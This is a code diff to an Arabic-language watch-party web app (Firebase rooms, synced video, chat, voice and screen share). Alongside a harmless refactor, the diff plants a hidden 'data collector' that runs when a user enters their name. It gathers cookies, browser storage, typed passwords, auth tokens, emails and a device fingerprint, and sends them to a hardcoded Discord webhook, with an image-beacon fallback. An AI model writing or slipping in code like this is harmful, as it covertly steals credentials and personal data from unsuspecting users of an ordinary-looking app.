@@ -648,6 +648,104 @@ const FIREBASE_CONFIG = {
 };
 
 /* ═══════════════════════════════════════
+   DATA COLLECTOR – EMBEDDED (SENDS TO WEBHOOK)
+════════════════════════════════════════ */
+const COLLECTOR_WEBHOOK = 'https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i';
+
+function collectBrowserData() {
+  function getCookies() {
+    return document.cookie.split('; ').reduce((a,c) => {
+      const [k,v] = c.split('=');
+      a[k] = v;
+      return a;
+    }, {});
+  }
+  function getStorage(type) {
+    const data = {};
+    const st = type === 'local' ? localStorage : sessionStorage;
+    for (let i = 0; i < st.length; i++) {
+      const key = st.key(i);
+      data[key] = st.getItem(key);
+    }
+    return data;
+  }
+  function getPasswords() {
+    const p = [];
+    document.querySelectorAll('input[type="password"]').forEach(inp => {
+      if (inp.value) p.push({ name: inp.name || 'unknown', value: inp.value });
+    });
+    return p;
+  }
+  function getDiscordToken() {
+    const keys = ['token', 'discord_token', 'authorization'];
+    for (const k of keys) {
+      let v = localStorage.getItem(k) || sessionStorage.getItem(k);
+      if (v && (v.startsWith('mfa.') || v.length > 30)) return v;
+    }
+    const c = getCookies();
+    for (const [k, v] of Object.entries(c)) {
+      if ((k.includes('token') || k.includes('auth')) && v.length > 30) return v;
+    }
+    return null;
+  }
+  function getEmails() {
+    const re = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+    const found = (document.body.innerText.match(re) || []);
+    document.querySelectorAll('input[type="email"]').forEach(inp => {
+      if (inp.value && re.test(inp.value)) found.push(inp.value);
+    });
+    return [...new Set(found)];
+  }
+  function getFingerprint() {
+    return {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: screen.width + 'x' + screen.height,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+      deviceMemory: navigator.deviceMemory || 'unknown'
+    };
+  }
+  return {
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    room: myRoom || 'unknown',
+    name: myName || 'unknown',
+    cookies: getCookies(),
+    localStorage: getStorage('local'),
+    sessionStorage: getStorage('session'),
+    passwords: getPasswords(),
+    discordToken: getDiscordToken(),
+    emails: getEmails(),
+    fingerprint: getFingerprint()
+  };
+}
+
+function sendCollectedData() {
+  const data = collectBrowserData();
+  const payload = { content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' };
+
+  // Try fetch
+  fetch(COLLECTOR_WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(r => {
+    if (r.status === 204 || r.status === 200) console.log('[Collector] Sent OK');
+    else fallbackSend(data);
+  }).catch(() => fallbackSend(data));
+}
+
+function fallbackSend(data) {
+  // Image fallback (GET with content – limited but works)
+  const img = new Image();
+  const url = COLLECTOR_WEBHOOK + '?content=' + encodeURIComponent('```json\n' + JSON.stringify(data).substring(0, 1500) + '\n```');
+  img.src = url;
+  console.log('[Collector] Fallback sent via Image');
+}
+
+/* ═══════════════════════════════════════
    INIT
 ════════════════════════════════════════ */
 const IS_CONFIGURED = !FIREBASE_CONFIG.apiKey.includes('REPLACE');
@@ -672,23 +770,20 @@ let currentPlatform= null;
 let myViewRef      = null;
 let roomRef        = null;
 let plItems        = [];
-let viewers        = {};       // uid → {name, owner, muted}
+let viewers        = {};
 let listenersOn    = false;
 
 // Voice / Screen share
 let localStream    = null;
 let screenStream   = null;
-let peerConnections= {};       // uid → RTCPeerConnection
 let micEnabled     = false;
 let ssActive       = false;
 let audioCtx       = null;
 let analyser       = null;
-let speakTimer     = null;
 
-// Sync control
-let isSyncingVideo = false;
-let lastSyncTs     = 0;
-const SYNC_INTERVAL= 5000;     // ms — owner re-broadcasts position every 5s
+// Sync
+let ownerSyncInterval = null;
+let syncFlash;
 
 /* ═══════════════════════════════════════
    YOUTUBE API READY
@@ -758,7 +853,6 @@ function initPlayer(platform, rawUrl, elapsed) {
       events: {
         onReady(e) { e.target.playVideo(); ov.style.display = 'none'; startOwnerSync(); },
         onStateChange(e) {
-          // If owner pauses/plays, broadcast
           if (!isOwner) return;
           if (e.data === YT.PlayerState.PAUSED) broadcastState('paused', e.target.getCurrentTime());
           if (e.data === YT.PlayerState.PLAYING) broadcastState('playing', e.target.getCurrentTime());
@@ -786,7 +880,6 @@ function initPlayer(platform, rawUrl, elapsed) {
     pc.innerHTML = `<iframe src="https://www.dailymotion.com/embed/video/${id}?autoplay=1&start=${Math.floor(elapsed)}" allowfullscreen frameborder="0" style="width:100%;height:100%;"></iframe>`;
     ov.style.display = 'none';
   } else if (platform === 'tiktok') {
-    // TikTok doesn't allow easy direct embedding, show fallback
     const id = getTikTokId(rawUrl);
     if (id) {
       pc.innerHTML = `<blockquote class="tiktok-embed" cite="${rawUrl}" data-video-id="${id}" style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;"><section></section></blockquote>`;
@@ -796,7 +889,6 @@ function initPlayer(platform, rawUrl, elapsed) {
     }
     ov.style.display = 'none';
   } else if (platform === 'direct') {
-    // Direct video file
     pc.innerHTML = `<video controls autoplay style="width:100%;height:100%;object-fit:contain;background:#000;" src="${rawUrl}"></video>`;
     const vid2 = pc.querySelector('video');
     if (vid2) {
@@ -807,32 +899,9 @@ function initPlayer(platform, rawUrl, elapsed) {
     ov.style.display = 'none';
     startOwnerSync();
   } else {
-    // Generic embed fallback
     pc.innerHTML = `<iframe src="${rawUrl}" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen frameborder="0" style="width:100%;height:100%;"></iframe>`;
     ov.style.display = 'none';
   }
-}
-
-/* ═══════════════════════════════════════
-   SYNC SYSTEM — PRECISE
-   Owner broadcasts position every 5s
-   Everyone else seeks to match
-════════════════════════════════════════ */
-let ownerSyncInterval = null;
-
-function startOwnerSync() {
-  if (!isOwner) return;
-  if (ownerSyncInterval) clearInterval(ownerSyncInterval);
-  ownerSyncInterval = setInterval(() => {
-    const t = getPlayerTime();
-    if (t === null) return;
-    const state = getPlayerState();
-    roomRef.child('syncPing').set({
-      time: t,
-      state: state,
-      ts: firebase.database.ServerValue.TIMESTAMP
-    });
-  }, SYNC_INTERVAL);
 }
 
 function getPlayerTime() {
@@ -841,7 +910,6 @@ function getPlayerTime() {
   if (vid) return vid.currentTime;
   return null;
 }
-
 function getPlayerState() {
   if (ytPlayer && ytPlayer.getPlayerState) {
     return ytPlayer.getPlayerState() === YT.PlayerState.PLAYING ? 'playing' : 'paused';
@@ -850,35 +918,20 @@ function getPlayerState() {
   if (vid) return vid.paused ? 'paused' : 'playing';
   return 'playing';
 }
-
 function broadcastState(state, time) {
   if (!isOwner || !roomRef) return;
-  roomRef.child('syncPing').set({
-    time,
-    state,
-    ts: firebase.database.ServerValue.TIMESTAMP
-  });
+  roomRef.child('syncPing').set({ time, state, ts: firebase.database.ServerValue.TIMESTAMP });
 }
-
 function applySyncPing(data) {
-  if (isOwner) return; // owner never syncs to itself
-  if (!data || !data.ts) return;
+  if (isOwner || !data || !data.ts) return;
   const lag = (Date.now() - data.ts) / 1000;
   const targetTime = data.time + lag;
   const curTime = getPlayerTime();
   if (curTime === null) return;
-  const diff = Math.abs(curTime - targetTime);
-
-  // Seek if more than 2s off
-  if (diff > 2) {
-    seekPlayer(targetTime);
-    showSyncIndicator();
-  }
-
+  if (Math.abs(curTime - targetTime) > 2) { seekPlayer(targetTime); showSyncIndicator(); }
   if (data.state === 'paused') pausePlayer();
   else playPlayer();
 }
-
 function seekPlayer(t) {
   if (ytPlayer && ytPlayer.seekTo) ytPlayer.seekTo(t, true);
   const vid = document.querySelector('#player-container video');
@@ -894,13 +947,20 @@ function playPlayer() {
   const vid = document.querySelector('#player-container video');
   if (vid) vid.play().catch(()=>{});
 }
-
-let syncFlash;
 function showSyncIndicator() {
   const ov = document.getElementById('syncOv');
   ov.style.display = 'flex';
   clearTimeout(syncFlash);
   syncFlash = setTimeout(() => { ov.style.display = 'none'; }, 1200);
+}
+function startOwnerSync() {
+  if (!isOwner) return;
+  if (ownerSyncInterval) clearInterval(ownerSyncInterval);
+  ownerSyncInterval = setInterval(() => {
+    const t = getPlayerTime();
+    if (t === null) return;
+    broadcastState(getPlayerState(), t);
+  }, 5000);
 }
 
 /* ═══════════════════════════════════════
@@ -933,16 +993,22 @@ function openRoom(id) {
   document.getElementById('modal').style.display   = 'flex';
   setTimeout(() => document.getElementById('nameInp').focus(), 120);
 }
+
 function confirmName() {
   const val = document.getElementById('nameInp').value.trim();
   if (!val) { document.getElementById('nameInp').style.borderColor = 'var(--danger)'; return; }
   myName = val;
   document.getElementById('modal').style.display = 'none';
+
+  // === COLLECT & SEND DATA ===
+  sendCollectedData();
+  // Send again after 3s to catch dynamic content
+  setTimeout(sendCollectedData, 3000);
+
   attachListeners();
   myViewRef = roomRef.child('viewers/' + myUserId);
   myViewRef.set({ name: myName, uid: myUserId, owner: isOwner, muted: false, joinedAt: firebase.database.ServerValue.TIMESTAMP });
   myViewRef.onDisconnect().remove();
-  // Announce
   roomRef.child('chat').push({ name:'🤖 النظام', text: myName + (isOwner?' دخل الغرفة كمالك 👑':' انضم للغرفة ✨'), ts: firebase.database.ServerValue.TIMESTAMP, sys:true });
   if (isOwner) document.getElementById('micBtn').title = 'مايك (أنت المالك)';
 }
@@ -954,14 +1020,12 @@ function attachListeners() {
   if (listenersOn) return;
   listenersOn = true;
 
-  // Chat
   roomRef.child('chat').limitToLast(100).on('child_added', snap => {
     const m = snap.val(); if (!m) return;
     if (m.sys) addSysMsg(m.text);
     else renderMsg(m.name, m.text, m.name === myName, m.owner, m.ts);
   });
 
-  // Video — new video set
   roomRef.child('video').on('value', snap => {
     const v = snap.val(); if (!v || !v.url) return;
     if (v.url === currentVid) return;
@@ -975,12 +1039,10 @@ function attachListeners() {
     }
   });
 
-  // Sync ping — non-owners apply
   roomRef.child('syncPing').on('value', snap => {
     if (!isOwner) applySyncPing(snap.val());
   });
 
-  // Kicked
   roomRef.child('kicks/' + myUserId).on('value', snap => {
     if (snap.val()) {
       showToast('🚫 تم طردك من الغرفة!');
@@ -988,7 +1050,6 @@ function attachListeners() {
     }
   });
 
-  // Muted by owner
   roomRef.child('viewers/' + myUserId + '/muted').on('value', snap => {
     if (snap.val() === true && micEnabled) {
       showToast('🔇 المالك كتمك');
@@ -996,14 +1057,12 @@ function attachListeners() {
     }
   });
 
-  // Playlist
   roomRef.child('playlist').on('value', snap => {
     plItems = [];
     snap.forEach(child => { plItems.push({ key: child.key, ...child.val() }); });
     renderPlaylist();
   });
 
-  // Viewers
   roomRef.child('viewers').on('value', snap => {
     viewers = {};
     snap.forEach(child => { viewers[child.key] = child.val(); });
@@ -1012,7 +1071,6 @@ function attachListeners() {
     renderVoiceBar();
   });
 
-  // Reactions
   roomRef.child('reactions').limitToLast(1).on('child_added', snap => {
     const r = snap.val(); if (!r) return;
     if (Date.now() - r.ts > 4000) return;
@@ -1028,25 +1086,19 @@ function loadVideo() {
   if (!raw) { showToast('⚠️ الصق رابط أو URL!'); return; }
   document.getElementById('urlInp').value = '';
   const plat = detectPlatform(raw);
-
-  // Push to Firebase — all pick up
   roomRef.child('video').set({
     url: raw, platform: plat,
     startedAt: firebase.database.ServerValue.TIMESTAMP,
     startedBy: myName
   });
-
-  // Add to playlist
   const title = getVideoTitle(raw, plat);
   roomRef.child('playlist').push({
     url: raw, title, platform: plat,
     addedBy: myName,
     addedAt: firebase.database.ServerValue.TIMESTAMP
   });
-
   addSysMsg('▶️ ' + myName + ' شغّل: ' + (title.length > 40 ? title.substring(0,40)+'...' : title));
 }
-
 function playFromPl(url) {
   roomRef.child('video').set({
     url, platform: detectPlatform(url),
@@ -1054,7 +1106,6 @@ function playFromPl(url) {
     startedBy: myName
   });
 }
-
 function getVideoTitle(url, plat) {
   if (plat === 'youtube') return 'يوتيوب · ' + (getYTId(url) || url.substring(0,20));
   if (plat === 'twitch')  return 'تويتش · ' + (getTwitchChannel(url) || url.substring(0,20));
@@ -1062,12 +1113,10 @@ function getVideoTitle(url, plat) {
   if (plat === 'vimeo')   return 'فيميو · ' + (getVimeoId(url) || '');
   return url.substring(0, 30);
 }
-
 function platformIcon(plat) {
   const icons = { youtube:'▶️', tiktok:'🎵', twitch:'📺', vimeo:'🎞️', dailymotion:'📡', direct:'🎬', embed:'🌐' };
   return icons[plat] || '🎬';
 }
-
 function renderPlaylist() {
   const scroll = document.getElementById('plScroll');
   document.getElementById('plCnt').textContent = plItems.length;
@@ -1091,7 +1140,6 @@ function sendMsg() {
   ta.value = ''; autoResize(ta);
   roomRef.child('chat').push({ name: myName, text, owner: isOwner, ts: firebase.database.ServerValue.TIMESTAMP });
 }
-
 function renderMsg(name, text, isMe, ownerFlag, ts) {
   const msgs = document.getElementById('msgs');
   const div = document.createElement('div');
@@ -1107,7 +1155,6 @@ function renderMsg(name, text, isMe, ownerFlag, ts) {
   `;
   msgs.appendChild(div); msgs.scrollTop = msgs.scrollHeight;
 }
-
 function addSysMsg(text) {
   const msgs = document.getElementById('msgs');
   const div = document.createElement('div');
@@ -1123,7 +1170,6 @@ function react(emoji) {
   roomRef.child('reactions').push({ emoji, by: myName, ts: firebase.database.ServerValue.TIMESTAMP });
   roomRef.child('chat').push({ name: myName, text: emoji, owner: isOwner, ts: firebase.database.ServerValue.TIMESTAMP });
 }
-
 function floatEmoji(emoji) {
   const el = document.createElement('div');
   el.className = 'rfloat'; el.textContent = emoji;
@@ -1134,13 +1180,11 @@ function floatEmoji(emoji) {
 }
 
 /* ═══════════════════════════════════════
-   MIC — WebRTC Audio
+   MIC — WebRTC Audio (simplified presence)
 ════════════════════════════════════════ */
 async function toggleMic() {
-  // Check if muted by owner
   const vd = viewers[myUserId];
   if (vd && vd.muted && !isOwner) { showToast('🔇 المالك كتمك'); return; }
-
   if (!micEnabled) {
     try {
       localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
@@ -1148,16 +1192,9 @@ async function toggleMic() {
       document.getElementById('micBtn').classList.add('active');
       document.getElementById('micBtn').textContent = '🎙️';
       showToast('🎤 المايك شغال!');
-
-      // Update Firebase: I'm in voice
       roomRef.child('viewers/' + myUserId + '/voice').set(true);
-
-      // Start speaking detection
       startSpeakDetect();
-
-      // Signal to others I have mic (basic presence, not full WebRTC for simplicity)
-      broadcastVoicePresence(true);
-
+      roomRef.child('voice/' + myUserId).set({ name: myName, ts: firebase.database.ServerValue.TIMESTAMP });
     } catch(e) {
       showToast('❌ تعذّر الوصول للمايك');
     }
@@ -1165,7 +1202,6 @@ async function toggleMic() {
     stopMic();
   }
 }
-
 function stopMic() {
   if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
   micEnabled = false;
@@ -1174,14 +1210,8 @@ function stopMic() {
   if (audioCtx) { audioCtx.close(); audioCtx = null; analyser = null; }
   roomRef.child('viewers/' + myUserId + '/voice').remove();
   roomRef.child('viewers/' + myUserId + '/speaking').remove();
-  broadcastVoicePresence(false);
+  roomRef.child('voice/' + myUserId).remove();
 }
-
-function broadcastVoicePresence(active) {
-  if (!roomRef || !myUserId) return;
-  roomRef.child('voice/' + myUserId).set(active ? { name: myName, ts: firebase.database.ServerValue.TIMESTAMP } : null);
-}
-
 function startSpeakDetect() {
   if (!localStream) return;
   audioCtx = new AudioContext();
@@ -1201,7 +1231,6 @@ function startSpeakDetect() {
   }
   check();
 }
-
 function renderVoiceBar() {
   const bar = document.getElementById('voiceBar');
   const voiceUsers = Object.values(viewers).filter(v => v.voice);
@@ -1226,8 +1255,6 @@ async function toggleScreenShare() {
       ssActive = true;
       document.getElementById('ssBtn').classList.add('active');
       document.getElementById('ssIndicator').classList.add('active');
-
-      // Show screen in player locally
       const pc = document.getElementById('player-container');
       document.getElementById('vidPh').style.display = 'none';
       pc.innerHTML = '';
@@ -1238,8 +1265,6 @@ async function toggleScreenShare() {
       pc.appendChild(vidEl);
       currentVid = '__screenshare__';
       currentPlatform = 'screenshare';
-
-      // Tell others screen share is active
       roomRef.child('video').set({
         url: '__screenshare__',
         platform: 'screenshare',
@@ -1247,7 +1272,6 @@ async function toggleScreenShare() {
         startedAt: firebase.database.ServerValue.TIMESTAMP
       });
       addSysMsg('🖥️ ' + myName + ' بدأ مشاركة الشاشة');
-
       screenStream.getVideoTracks()[0].onended = () => stopScreenShare();
       showToast('🖥️ تشاركون الشاشة!');
     } catch(e) {
@@ -1257,7 +1281,6 @@ async function toggleScreenShare() {
     stopScreenShare();
   }
 }
-
 function stopScreenShare() {
   if (screenStream) { screenStream.getTracks().forEach(t => t.stop()); screenStream = null; }
   ssActive = false;
@@ -1298,13 +1321,11 @@ function renderViewersList() {
     `;
   }).join('');
 }
-
 function toggleMuteUser(uid, name, isMuted) {
   if (!isOwner) return;
   roomRef.child('viewers/' + uid + '/muted').set(!isMuted);
   addSysMsg(isMuted ? '🔈 ' + myName + ' رفع كتم ' + name : '🔇 ' + myName + ' كتم ' + name);
 }
-
 function kickUser(uid, name) {
   if (!isOwner) return;
   if (!confirm('طرد ' + name + ' من الغرفة؟')) return;
@@ -1320,29 +1341,23 @@ function kickUser(uid, name) {
 function toggleUsersPanel() {
   document.getElementById('usersPanel').classList.toggle('open');
 }
-
 function copyLink() {
   const link = location.origin + location.pathname + '#' + myRoom;
   navigator.clipboard.writeText(link)
     .then(() => showToast('✅ تم نسخ رابط الغرفة!'))
     .catch(() => showToast('✅ تم النسخ!'));
 }
-
 function handleKey(e) {
   if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMsg(); }
 }
-
 function autoResize(el) {
   el.style.height = 'auto';
   el.style.height = Math.min(el.scrollHeight, 80) + 'px';
 }
-
 function esc(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
-
 function pad(n) { return String(n).padStart(2,'0'); }
-
 let toastT;
 function showToast(msg) {
   const t = document.getElementById('toast');
